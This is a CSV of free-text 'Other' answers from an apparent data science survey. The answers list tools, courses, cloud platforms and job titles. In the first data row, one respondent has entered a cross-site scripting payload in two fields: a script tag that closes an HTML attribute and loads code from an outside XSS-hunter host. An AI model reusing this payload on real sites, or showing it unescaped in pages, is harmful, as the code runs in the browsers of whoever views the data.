Q12_OTHER_TEXT,Q13_OTHER_TEXT,Q14_OTHER_TEXT,Q14_Part_1_TEXT,Q14_Part_2_TEXT,Q14_Part_3_TEXT,Q14_Part_4_TEXT,Q14_Part_5_TEXT,Q16_OTHER_TEXT,Q17_OTHER_TEXT,Q18_OTHER_TEXT,Q19_OTHER_TEXT,Q20_OTHER_TEXT,Q21_OTHER_TEXT,Q24_OTHER_TEXT,Q25_OTHER_TEXT,Q26_OTHER_TEXT,Q27_OTHER_TEXT,Q28_OTHER_TEXT,Q29_OTHER_TEXT,Q2_OTHER_TEXT,Q30_OTHER_TEXT,Q31_OTHER_TEXT,Q32_OTHER_TEXT,Q33_OTHER_TEXT,Q34_OTHER_TEXT,Q5_OTHER_TEXT,Q9_OTHER_TEXT
Who/what are your favorite media sources that report on data science topics? (Select all that apply) - Other - Text,On which platforms have you begun or completed data science courses? (Select all that apply) - Other - Text,What is the primary tool that you use at work or school to analyze data? (Include text response) - Other - Text,"What is the primary tool that you use at work or school to analyze data? (Include text response) - Basic statistical software (Microsoft Excel, Google Sheets, etc.) - Text","What is the primary tool that you use at work or school to analyze data? (Include text response) - Advanced statistical software (SPSS, SAS, etc.) - Text","What is the primary tool that you use at work or school to analyze data? (Include text response) - Business intelligence software (Salesforce, Tableau, Spotfire, etc.) - Text","What is the primary tool that you use at work or school to analyze data? (Include text response) - Local development environments (RStudio, JupyterLab, etc.) - Text","What is the primary tool that you use at work or school to analyze data? (Include text response) - Cloud-based data software & APIs (AWS, GCP, Azure, etc.) - Text",Which of the following integrated development environments (IDE's) do you use on a regular basis?  (Select all that apply) - Other - Text,Which of the following hosted notebook products do you use on a regular basis?  (Select all that apply) - Other - Text,What programming languages do you use on a regular basis? (Select all that apply) - Other - Text,What programming language would you recommend an aspiring data scientist to learn first? - Other - Text,What data visualization libraries or tools do you use on a regular basis?  (Select all that apply) - Other - Text,Which types of specialized hardware do you use on a regular basis?  (Select all that apply) - Other - Text,Which of the following ML algorithms do you use on a regular basis? (Select all that apply): - Other - Text,Which categories of ML tools do you use on a regular basis?  (Select all that apply) - Other - Text,Which categories of computer vision methods do you use on a regular basis?  (Select all that apply) - Other - Text,Which of the following natural language processing (NLP) methods do you use on a regular basis?  (Select all that apply) - Other - Text,Which of the following machine learning frameworks do you use on a regular basis? (Select all that apply) - Other - Text,Which of the following cloud computing platforms do you use on a regular basis? (Select all that apply) - Other - Text,What is your gender? - Prefer to self-describe - Text,Which specific cloud computing products do you use on a regular basis? (Select all that apply) - Other - Text,Which specific big data / analytics products do you use on a regular basis? (Select all that apply) - Other - Text,Which of the following machine learning products do you use on a regular basis? (Select all that apply) - Other - Text,Which automated machine learning tools (or partial AutoML tools) do you use on a regular basis?  (Select all that apply) - Other - Text,Which of the following relational database products do you use on a regular basis? (Select all that apply) - Other - Text,Select the title most similar to your current role (or most recent title if retired): - Other - Text,Select any activities that make up an important part of your role at work: (Select all that apply) - Other - Text
"""><script src=https://abels.xss.ht></script>",,,Sheets,,,,,,,,,,,,,,,,,,,,,,,,"""><script src=https://abels.xss.ht></script>"
,,,Microsoft Excel,,,,,,,,,,,,,,,,,,,,,,,,
,,,D,,,,,,,,,,,,,,,,,,,,,,,,
,,,Microsoft Excel,,,,,,,,,,,,,,,,,,,,,,,,
Newsletters,,,,,,Python scripts,,,,,,,,,,,,,,,,,,,,,
,,,,,,Jupyterlab,,,,,,,,,,,,,,,,,,,,,
,sane academy india,,,,,"RStudio , JupyterLab ",,"SPSS , MINITAB",,,,,,,,,,,,,,,,,,,
,,"Python, jupyter, tensorflow",,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,JupyterLab,,,,,,,,,,,,,,,,,,,,,
,,,,,,Jupyter,,,,Kotlin,,,,,,,,,,,AWS Sagemaker,,,,,,
,self-study,,,,,jupyter notebook or pycharm,,,,,,,,,,,,,,,,,,,,,
,,,,,,jupyter notebook,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,Teacher,
,,,,,,,Google Colab,,,,,,,,,,,,,,,,,,,,
,,cplex,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,Jupyter Notebook,,,,,,,,,,,,,,,,,,,,,
,,,,,,Python,,,,,,,,,,,,,,,,,,,,,
,,,,,,Anaconda,,,,,,,,,,,,,,,,,,,,,
,,,,,,,aws,,,,,,,,,,,,,,,,,,,,
,,,Excel,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,Quality Engineer,
,simplilearn,,,,,Jupyterlab,,,,,,,,,,,,,,,,,,,,,
,,,,,Power BI,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,Rapid miner and weka ,,,,,,Eclipse,,,,,,,Rapid miner and weka ,,,,,,,,,,,,
,,,,SPSS,,,,,,,,,,,,,,,,,,,,,,,
,,,,,Tableau,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,GCP,,,,,,,,,,,,,,,,,,,,
,,,,,,Python,,,,,,"Pandas, Numpy, Scipy, Sklearn",,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,R,,,,,,,,"Svm ,  neural network  , knn",,,,,,,,,,,,,
,,,Excel,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,jupyterlab,,,,,,,,,,,,,,,,,,,,,
,,,Excel,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,"Rstudio, JupyterLab",,,,,,,,,,,,,,,,,,,,,
,,,,,,,AWS,,,,,,,,,,,,,,,,,,,,
,,,"octave, Matlab and Python",,,,,python and octave,,octave,,,,,,,,,,,,,,,,,
,,,Microsoft Excel,,,,,,,,,,,,,,,,,,,,,,,,
,,what is this?,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,"sas, stata, R, python",,,,,,,,,,,,,,,,,,,,,,,nonprofit research
,,,,,,Jupyterlab,,,,,,,,,,,,,,,,,,,,,
,,,,,,jupyter,,,,,,,,,,,,,,,,,,,,,
,,,,,,Jupyter Notebook,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,AWS,,,Julia,,,,,,,,,,,,,,,,,
,,,,,,JupyterLab,,,,,,,,,,,,,,,,,,,,,
,,,,,,,image encryption,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,EXCEL,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,"Gcp, AI emgine app engine",,,,,,,,,,,,,,,,,,,,
,,,,,,,Sagemaker,,,,,,,,,,,,,,,,,,,,
,,,,,,Python/R local dev /w remote storage/processing,,,,,,,,,,,,,,,,,,,,,
,,t4st,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,cloud based compute engine distributed over multiple clouds and on-prem hardware.,,Cnvrg.io,,,,,,,,,,,,,,,,,,
,Purwadhika Startup and Coding School,,,,,"RStudio, JupyterLab",,,,,,,,,,,,,,,,,,,,,Educate data science field to the other people
,Appliedaicourse,,,,,Jupyter,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Stackoverflow, coursera, github",,,,,,Spyder,,,,,,"Pandas, matplotlib",,,,,,,,,,,,,,,
,,,Python programming language ,,,,,,,,,,,,,,,,,,,,,,,,
